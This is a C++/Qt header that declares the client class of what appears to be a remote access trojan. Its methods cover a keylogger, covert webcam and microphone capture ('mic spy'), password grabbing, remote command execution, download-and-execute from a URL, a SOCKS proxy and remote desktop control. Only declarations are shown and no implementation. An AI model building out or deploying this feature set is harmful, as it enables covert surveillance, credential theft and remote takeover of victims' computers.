#ifndef CLIENT_H
#define CLIENT_H

#include "../common/abstractclient.h"

class Client : public AbstractClient
{
    Q_OBJECT

    QString _serverAddress;
public:
    Client();

    QString serverAddress() const;
    void setServerAddress(const QString &serverAddress);

public slots:
    void pingSlot() override;
    QVariant infoSlot() override;

    QVariant tasksSlot() override;
    void messageBoxSlot(QString title, QString text, int icons) override;
    QVariant startupItemsSlot() override;
    void shutdownSlot() override;
    void rebootSlot() override;
    void logoutSlot() override;

    QVariant executeSlot(QString command, QString dir) override;
    QImage screenshotSlot() override;
    QImage webcamImageSlot() override;
    QVariant dirEntriesSlot(QString path) override;
    void visitWebsiteSlot(QString url, int mode) override;

    int killProcessSlot(int pid) override;

    //webcam
    QStringList camerasSlot() override;
    bool startCameraSlot(QByteArray deviceName) override;
    void stopCameraSlot() override;
    QImage cameraFrameSlot() override;

    QVariant systemInformationsSlot() override;

    bool startVncSlot() override;

    //remote desktop
    bool startRemoteDesktopSlot(int width, int heigth, int colors, int port) override;
    void endRemoteDesktopSlot() override;
    void mouseClickSlot(QPoint pt, int key) override;
    void mousePressSlot(QPoint pt, int key) override;
    void mouseReleaseSlot(QPoint pt, int key) override;
    void mouseMoveSlot(QPoint pt, int key) override;
    void keyPressSlot(int key, int modifs) override;

    void lockDesktopSlot() override;
    void unlockDesktopSlot() override;

    //socks proxy
    bool startSocksProxySlot(int port, qreal throttle) override;
    QVariant querySocksProxySlot() override;
    bool requestNewConnectionSlot() override;
    bool endSocksProxySlot() override;

    QVariant detectorSlot() override;

    bool startKeyloggerSlot() override;
    bool queryKeyloggerSlot() override;
    bool stopKeyloggerSlot() override;
    QString keyloggerFileSlot() override;

    QVariant grabUrlsSlot() override;

    //registry
    QStringList registryChilds(QString &path);
    QVariantList registryKeys(QString &path);

    //mic spy
    QStringList micListSlot();
    bool startMicSpySlot(QString deviceName, int port) override;
    bool queryMicSpySlot() override;
    bool stopMicSpySlot() override;

    QVariantList passwordsSlot() override;
    void downloadAndExecSlot(QString url) override;
};

#endif // CLIENT_H
